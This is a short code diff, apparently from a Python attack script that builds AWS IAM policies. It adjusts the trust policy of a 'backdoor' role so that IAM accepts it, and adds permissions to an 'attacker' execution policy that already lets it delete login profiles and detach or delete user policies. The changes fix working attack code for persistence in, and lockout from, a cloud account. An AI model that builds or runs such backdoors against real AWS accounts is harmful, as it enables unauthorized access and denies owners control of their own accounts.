@@ -56,7 +56,7 @@ backdoor_role_trust = json.dumps({
     "Version": "2012-10-17",
     "Statement": [{
         "Effect":    "Allow",
-        "Principal": {"AWS": attacker_exec_role_arn_computed},
+        "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},  # IAM rejects a role principal that does not exist yet
         "Action":    "sts:AssumeRole",
     }],
 })
@@ -94,6 +94,7 @@ attacker_exec_policy_doc = json.dumps({
                 "iam:ListAccessKeys",
                 "iam:DeleteLoginProfile",
                 "iam:ListUserPolicies",
+                "iam:ListAttachedUserPolicies",
                 "iam:DetachUserPolicy",
                 "iam:DeleteUserPolicy",
             ],
